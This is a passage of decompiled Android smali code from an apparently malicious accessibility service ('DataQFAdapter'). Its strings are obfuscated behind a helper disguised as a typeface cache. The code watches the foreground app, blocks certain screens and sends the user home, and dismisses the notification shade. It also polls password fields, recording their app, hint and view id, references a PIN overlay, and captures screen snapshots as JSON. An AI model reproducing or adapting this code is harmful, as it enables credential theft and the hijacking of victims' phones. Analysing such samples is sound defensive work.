    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 273
    .line 274
    .line 275
    move-result v5

    .line 276
    if-nez v5, :cond_c

    .line 277
    .line 278
    const-string v5, "0034007F005D008E"

    .line 279
    .line 280
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 281
    .line 282
    .line 283
    move-result-object v5

    .line 284
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 285
    .line 286
    .line 287
    move-result v5

    nop

    .line 288
    if-eqz v5, :cond_e

    .line 289
    .line 290
    :cond_c
    const-string v5, "0021007A004E008200E400B000DD00B3002B"

    .line 291
    .line 292
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 293
    .line 294
    .line 295
    move-result-object v5

    .line 296
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 297
    .line 298
    .line 299
    move-result v5

    .line 300
    if-nez v5, :cond_d

    nop

    .line 301
    .line 302
    const-string v5, "04070428040604D704D004E70488"

    .line 303
    .line 304
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 305
    .line 306
    .line 307
    move-result-object v5

    .line 308
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 309
    .line 310
    .line 311
    move-result v5

    .line 312
    if-nez v5, :cond_d

    .line 313
    .line 314
    const-string v5, "0025007A005A009400F800B300DB00A0002B0062"

    .line 315
    .line 316
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 317
    .line 318
    .line 319
    move-result-object v5

    .line 320
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 321
    .line 322
    .line 323
    move-result v5

    .line 324
    if-nez v5, :cond_d

    .line 325
    .line 326
    const-string v5, "047F0428040A04DF04AB0493048F048C04760036040F04D704AD04E204F904F2"

    .line 327
    .line 328
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 329
    .line 330
    .line 331
    move-result-object v5

    .line 332
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 333
    .line 334
    .line 335
    move-result v5

    .line 336
    if-nez v5, :cond_d

    .line 337
    .line 338
    const-string v5, "002E00790059008E00FC00BA009200A300220062005A"

    .line 339
    .line 340
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 341
    .line 342
    .line 343
    move-result-object v5

    .line 344
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 345
    .line 346
    .line 347
    move-result v5

    .line 348
    if-nez v5, :cond_d

    .line 349
    .line 350
    const-string v5, "00220063004F008800BD00AD00DD00B300220062005E"

    .line 351
    .line 352
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 353
    .line 354
    .line 355
    move-result-object v5

    .line 356
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 357
    .line 358
    .line 359
    move-result v5

    .line 360
    if-nez v5, :cond_d

    .line 361
    .line 362
    const-string v5, "04730424047904D904AF04E1048004F9040304280479"

    .line 363
    .line 364
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 365
    .line 366
    .line 367
    move-result-object v5

    .line 368
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 369
    .line 370
    .line 371
    move-result v5

    .line 372
    if-nez v5, :cond_d

    .line 373
    .line 374
    const-string v5, "0022007F0049009700FC00BE00DC00A2"

    .line 375
    .line 376
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 377
    .line 378
    .line 379
    move-result-object v5

    .line 380
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 381
    .line 382
    .line 383
    move-result v5

    .line 384
    if-nez v5, :cond_d

    .line 385
    .line 386
    const-string v5, "04730424040304D704D004EA048404FF047F"

    .line 387
    .line 388
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 389
    .line 390
    .line 391
    move-result-object v5

    .line 392
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 393
    .line 394
    .line 395
    move-result v5

    .line 396
    if-nez v5, :cond_d

    .line 397
    .line 398
    const-string v5, "047E0423001B04D604A5049E048D04F904790428040304A504DC"

    .line 399
    .line 400
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 401
    .line 402
    .line 403
    move-result-object v5

    .line 404
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 405
    .line 406
    .line 407
    move-result v5

    .line 408
    if-nez v5, :cond_d

    .line 409
    .line 410
    const-string v5, "00270079001B008900FF00AB009200A3002A0065004F009200E200BD"

    .line 411
    .line 412
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 413
    .line 414
    .line 415
    move-result-object v5

    .line 416
    invoke-static {v4, v5, v7}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 417
    .line 418
    .line 419
    move-result v4

    .line 420
    if-eqz v4, :cond_e

    .line 421
    .line 422
    :cond_d
    iget-object v4, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 423
    .line 424
    new-instance v5, Lv/s/TgFV4UY0xAiKxQwpKNg;

    .line 425
    .line 426
    const/4 v6, 0x5

    .line 427
    invoke-direct {v5, p0, v6}, Lv/s/TgFV4UY0xAiKxQwpKNg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 428
    .line 429
    .line 430
    invoke-virtual {v4, v5}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 431
    .line 432
    .line 433
    :cond_e
    :try_start_4
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 434
    .line 435
    .line 436
    goto/16 :goto_8

    nop

    nop

    .line 437
    :goto_6
    :try_start_5
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    .line 438
    .line 439
    .line 440
    :catchall_1
    :try_start_6
    throw v4

    .line 441
    :cond_f
    :goto_7
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    .line 442
    .line 443
    .line 444
    goto/16 :goto_0

    nop

    nop

    .line 445
    .line 446
    :catchall_2
    :cond_10
    :goto_8
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 447
    .line 448
    .line 449
    move-result-wide v3

    .line 450
    iget-wide v5, p0, Lapp/mobilex/plus/services/DataQFAdapter;->_lastSettingsSeenPoll:J

    nop

    nop

    .line 451
    .line 452
    sub-long/2addr v3, v5

    .line 453
    const-wide/16 v5, 0x7d0

    .line 454
    .line 455
    cmp-long v3, v3, v5

    .line 456
    .line 457
    if-gez v3, :cond_11

    .line 458
    .line 459
    const-wide/16 v1, 0x96

    .line 460
    .line 461
    :cond_11
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 462
    .line 463
    .line 464
    goto/16 :goto_0

    nop

    .line 465
    .line 466
    :cond_12
    return-void
.end method

.method private static final startGuardPollThread$lambda$17$lambda$15(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static final startGuardPollThread$lambda$17$lambda$16(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-virtual {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->dismissNotificationShade$app_release()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private final startPwdPoll(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 1
    const/16 v0, 0x1

    .line 2
    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollActive:Z

    .line 3
    .line 4
    iput-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldKey:Ljava/lang/String;

    .line 5
    .line 6
    iput-object p2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 7
    .line 8
    iput-object p3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppName:Ljava/lang/String;

    .line 9
    .line 10
    iput-object p4, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHint:Ljava/lang/String;

    nop

    nop

    .line 11
    .line 12
    iput-object p5, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollViewId:Ljava/lang/String;

    .line 13
    .line 14
    iput-object p6, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldType:Ljava/lang/String;

    .line 15
    .line 16
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 17
    .line 18
    .line 19
    move-result-wide p1

    .line 20
    iput-wide p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollStartTime:J

    .line 21
    .line 22
    iget-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHandler:Landroid/os/Handler;

    .line 23
    .line 24
    iget-object p2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollRunnable:Ljava/lang/Runnable;

    .line 25
    .line 26
    invoke-virtual {p1, p2}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 27
    .line 28
    .line 29
    iget-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHandler:Landroid/os/Handler;

    .line 30
    .line 31
    iget-object p2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollRunnable:Ljava/lang/Runnable;

    .line 32
    .line 33
    iget-wide p3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->PWD_POLL_INTERVAL_MS:J

    .line 34
    .line 35
    invoke-virtual {p1, p2, p3, p4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 36
    .line 37
    .line 38
    return-void
.end method

.method private final stopPwdPoll()V
    .locals 2

    .line 1
    const/16 v0, 0x0

    .line 2
    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollActive:Z

    .line 3
    .line 4
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHandler:Landroid/os/Handler;

    .line 5
    .line 6
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollRunnable:Ljava/lang/Runnable;

    .line 7
    .line 8
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 9
    .line 10
    .line 11
    return-void
.end method

.method public static synthetic vekpFI4d1Nc4fakF(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->onServiceConnected$lambda$24(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic w9sT1Swbhx3hs(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayRemoveRunnable$lambda$12(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic wotphlvK9sPbXJ(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->onServiceConnected$lambda$22(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static synthetic xDyLpEZyrcKVe0(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->deferredInit$lambda$27(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method


# virtual methods
.method public final dismissNotificationShade$app_release()V
    .locals 6

    .line 1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 2
    .line 3
    .line 4
    move-result-wide v0

    .line 5
    iget-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastShadeDismissMs:J

    .line 6
    .line 7
    sub-long v2, v0, v2

    .line 8
    .line 9
    const-wide/16 v4, 0xc8

    .line 10
    .line 11
    cmp-long v2, v2, v4

    nop

    .line 12
    .line 13
    if-gez v2, :cond_0

    .line 14
    .line 15
    goto/16 :goto_1

    .line 16
    :cond_0
    iput-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastShadeDismissMs:J

    .line 17
    .line 18
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 19
    .line 20
    const v1, 0x1f

    .line 21
    .line 22
    if-lt v0, v1, :cond_1

    .line 23
    .line 24
    const/16 v0, 0xf

    .line 25
    .line 26
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 27
    .line 28
    .line 29
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 30
    .line 31
    const/16 v1, 0xb

    .line 32
    .line 33
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 34
    .line 35
    .line 36
    const-wide/16 v1, 0x50

    .line 37
    .line 38
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 39
    .line 40
    .line 41
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 42
    .line 43
    const/16 v1, 0xc

    .line 44
    .line 45
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 46
    .line 47
    .line 48
    invoke-direct {p0, v0, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    .line 49
    .line 50
    .line 51
    return-void

    .line 52
    :cond_1
    :try_start_1
    const-string v0, "00300062005A009300E500AC00D000A60031"

    .line 53
    .line 54
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 55
    .line 56
    .line 57
    move-result-object v0

    .line 58
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 59
    .line 60
    .line 61
    move-result-object v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 62
    if-eqz v0, :cond_2

    .line 63
    .line 64
    const/4 v1, 0x0

    .line 65
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 66
    .line 67
    .line 68
    move-result-object v2

    .line 69
    const-string v3, "002000790057008B00F100AF00C100A2001300770055008200FC00AC"

    .line 70
    .line 71
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 72
    .line 73
    .line 74
    move-result-object v3

    .line 75
    invoke-virtual {v2, v3, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    .line 76
    .line 77
    .line 78
    move-result-object v2

    .line 79
    invoke-virtual {v2, v0, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 80
    .line 81
    .line 82
    goto/16 :goto_0

    .line 83
    :catch_0
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 84
    .line 85
    .line 86
    move-result-object v2

    .line 87
    const-string v3, "002000790057008B00F100AF00C100A2"

    .line 88
    .line 89
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 90
    .line 91
    .line 92
    move-result-object v3

    .line 93
    invoke-virtual {v2, v3, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    .line 94
    .line 95
    .line 96
    move-result-object v2

    .line 97
    invoke-virtual {v2, v0, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 98
    .line 99
    .line 100
    :catch_1
    :cond_2
    :goto_0
    :try_start_4
    new-instance v0, Landroid/content/Intent;

    nop

    .line 101
    .line 102
    const-string v1, "00220078005F009500FF00B600D600E9002A0078004F008200FE00AB009C00A6002000620052008800FE00F100F1008B000C0045007E00B800C3008600E100930006005B006400A300D9009E00FE008800040045"

    nop

    .line 103
    .line 104
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 105
    .line 106
    .line 107
    move-result-object v1

    .line 108
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 109
    .line 110
    .line 111
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 112
    .line 113
    .line 114
    :catch_2
    const/16 v0, -0x4a

    add-int/lit8 v0, v0, 0x4b

    .line 115
    :try_start_5
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 116
    .line 117
    .line 118
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 119
    .line 120
    const/16 v1, 0xd

    .line 121
    .line 122
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 123
    .line 124
    .line 125
    const-wide/16 v1, 0x64

    .line 126
    .line 127
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 128
    .line 129
    .line 130
    :catch_3
    :goto_1
    return-void
.end method

.method public final getScreenInfo()Lorg/json/JSONObject;
    .locals 4

    .line 1
    new-instance v0, Lorg/json/JSONObject;

    .line 2
    .line 3
    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 4
    .line 5
    .line 6
    :try_start_0
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->getRealScreenSize()Lv/s/yI1KTRoNlsjx;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    iget-object v2, v1, Lv/s/yI1KTRoNlsjx;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 11
    .line 12
    check-cast v2, Ljava/lang/Number;

    .line 13
    .line 14
    invoke-virtual {v2}, Ljava/lang/Number;->intValue()I

    .line 15
    .line 16
    .line 17
    move-result v2

    nop

    nop

    .line 18
    iget-object v1, v1, Lv/s/yI1KTRoNlsjx;->vekpFI4d1Nc4fakF:Ljava/lang/Object;

    .line 19
    .line 20
    check-cast v1, Ljava/lang/Number;

    .line 21
    .line 22
    invoke-virtual {v1}, Ljava/lang/Number;->intValue()I

    .line 23
    .line 24
    .line 25
    move-result v1

    .line 26
    const-string v3, "0034007F005F009300F8"

    .line 27
    .line 28
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    move-result-object v3

    .line 32
    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 33
    .line 34
    .line 35
    const-string v2, "002B00730052008000F800AB"

    .line 36
    .line 37
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v2

    .line 41
    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 42
    .line 43
    .line 44
    const-string v1, "002700730055009400F900AB00CB"

    .line 45
    .line 46
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 47
    .line 48
    .line 49
    move-result-object v1

    .line 50
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 51
    .line 52
    .line 53
    move-result-object v2

    .line 54
    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 55
    .line 56
    .line 57
    move-result-object v2

    .line 58
    iget v2, v2, Landroid/util/DisplayMetrics;->density:F

    .line 59
    .line 60
    invoke-static {v2}, Ljava/lang/Float;->valueOf(F)Ljava/lang/Float;

    .line 61
    .line 62
    .line 63
    move-result-object v2

    .line 64
    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 65
    .line 66
    .line 67
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 68
    .line 69
    .line 70
    move-result-object v1

    .line 71
    if-eqz v1, :cond_0

    .line 72
    .line 73
    const-string v2, "003300770058008C00F100B800D700890022007B005E"

    .line 74
    .line 75
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v2

    .line 79
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    .line 80
    .line 81
    .line 82
    move-result-object v3

    .line 83
    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 84
    .line 85
    .line 86
    const-string v2, "0020007A005A009400E3009100D300AA0026"

    .line 87
    .line 88
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 89
    .line 90
    .line 91
    move-result-object v2

    .line 92
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    .line 93
    .line 94
    .line 95
    move-result-object v3

    nop

    .line 96
    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 97
    .line 98
    .line 99
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 100
    .line 101
    .line 102
    return-object v0

    .line 103
    :catch_0
    move-exception v1

    .line 104
    goto :goto_0

    .line 105
    :cond_0
    return-object v0

    .line 106
    :goto_0
    const-string v2, "00240073004F00B400F300AD00D700A2002D005F0055008100FF00FF00D700B500310079004900DD00B0"

    .line 107
    .line 108
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 109
    .line 110
    .line 111
    invoke-virtual {v1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 112
    .line 113
    .line 114
    return-object v0
.end method

.method public final getScreenSkeleton()Lorg/json/JSONObject;
    .locals 4

    .line 1
    new-instance v0, Lorg/json/JSONObject;

    .line 2
    .line 3
    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 4
    .line 5
    .line 6
    :try_start_0
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->getRealScreenSize()Lv/s/yI1KTRoNlsjx;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    iget-object v2, v1, Lv/s/yI1KTRoNlsjx;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 11
    .line 12
    check-cast v2, Ljava/lang/Number;

    .line 13
    .line 14
    invoke-virtual {v2}, Ljava/lang/Number;->intValue()I

    .line 15
    .line 16
    .line 17
    move-result v2

    .line 18
    iget-object v1, v1, Lv/s/yI1KTRoNlsjx;->vekpFI4d1Nc4fakF:Ljava/lang/Object;

    .line 19
    .line 20
    check-cast v1, Ljava/lang/Number;

    .line 21
    .line 22
    invoke-virtual {v1}, Ljava/lang/Number;->intValue()I

    .line 23
    .line 24
    .line 25
    move-result v1

    .line 26
    const-string v3, "0034007F005F009300F8"

    .line 27
    .line 28
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    move-result-object v3

    .line 32
    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 33
    .line 34
    .line 35
    const-string v2, "002B00730052008000F800AB"

    .line 36
    .line 37
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v2

    nop

    nop

    .line 41
    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 42
    .line 43
    .line 44
    const-string v1, "00240073004F00B400F300AD00D700A2002D00450050008200FC00BA00C600A8002D002C001B009400F300AD00D700A2002D0036"

    .line 45
    .line 46
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 47
    .line 48
    .line 49
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 50
    .line 51
    .line 52
    move-result-object v1

    .line 53
    const-string v2, "00240073004F00B400F300AD00D700A2002D00450050008200FC00BA00C600A8002D002C001B009500FF00B000C60089002C0072005E00C700AD00FF"

    .line 54
    .line 55
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 56
    .line 57
    .line 58
    invoke-static {v1}, Ljava/util/Objects;->toString(Ljava/lang/Object;)Ljava/lang/String;

    .line 59
    .line 60
    .line 61
    if-eqz v1, :cond_2

    .line 62
    .line 63
    const-string v2, "003300770058008C00F100B800D700890022007B005E"

    .line 64
    .line 65
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object v2

    .line 69
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    .line 70
    .line 71
    .line 72
    move-result-object v3

    .line 73
